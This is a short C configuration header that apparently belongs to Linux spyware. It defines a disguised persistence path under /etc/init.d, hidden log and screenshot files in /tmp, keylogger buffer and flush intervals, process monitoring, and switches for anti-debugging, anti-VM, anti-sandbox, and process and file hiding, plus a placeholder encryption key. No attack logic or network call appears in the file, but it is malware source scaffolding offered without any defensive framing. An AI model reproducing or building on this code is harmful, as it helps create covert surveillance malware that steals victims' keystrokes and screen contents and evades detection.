#ifndef CONFIG_H
#define CONFIG_H

// General configuration
#define DEBUG 0
#define LOG_FILE "/tmp/.system.log"
#define PERSISTENCE_PATH "/etc/init.d/system-monitor"

// Network configuration
#define MAX_CONNECTIONS 5
#define CONNECTION_TIMEOUT 10  // seconds
#define RETRY_ATTEMPTS 3

// File system configuration
#define MAX_FILE_SIZE 10 * 1024 * 1024  // 10MB
#define FILE_CHUNK_SIZE 1024 * 1024     // 1MB
#define SCREENSHOT_PATH "/tmp/.screenshot.png"

// Keylogger configuration
#define KEYLOG_BUFFER_SIZE 1024
#define KEYLOG_FLUSH_INTERVAL 60  // seconds

// Process monitoring configuration
#define PROCESS_MONITOR_INTERVAL 30  // seconds
#define MAX_PROCESS_LIST_SIZE 1024

// Evasion configuration
#define ENABLE_ANTI_DEBUG 1
#define ENABLE_ANTI_VM 1
#define ENABLE_ANTI_SANDBOX 1
#define ENABLE_PROCESS_HIDING 1
#define ENABLE_FILE_HIDING 1

// Encryption configuration
#define ENCRYPTION_KEY "supersecretkey123"  // Replace with actual key
#define ENCRYPTION_ALGORITHM "AES-256-CBC"

#endif // CONFIG_H